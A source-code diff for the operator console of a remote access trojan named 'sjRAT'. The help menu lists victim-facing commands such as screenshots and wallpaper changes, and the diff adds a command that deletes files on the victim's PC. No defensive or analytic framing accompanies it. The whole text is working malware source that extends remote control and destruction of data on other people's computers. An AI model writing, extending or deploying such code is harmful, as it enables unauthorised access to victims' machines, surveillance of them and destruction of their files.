@@ -56,6 +56,7 @@ void help_menu()
     printf("screenshot - take screenshot from victim's PC\n\n");
     printf("play <file> - play music from file\n\n");
     printf("wallpaper <file> - set wallpaper on victim`s PC\n\n");
+    printf("delete <file> - remove file from victim`s PC\n\n");
     printf("help - see this message\n\n");
     printf("exit - exit sjRAT and terminate client session\n\n");
     printf("=====================================\n");
@@ -207,6 +208,14 @@ int main(int argc, char* argv[])
                 } else {
                     ColoredText(F_LIGHTRED);
                     printf("[!] Usage: download <filename>\n");
+                }
+            }
+            else if (command.substr(0, 6) == "delete") {
+                if (command.length() > 6) {
+                    SendAndReceive(client, command);
+                } else {
+                    ColoredText(F_LIGHTRED);
+                    printf("[!] Usage: delete <filename>\n");
                 }
             }
             else if (command.substr(0, 7) == "execute") {
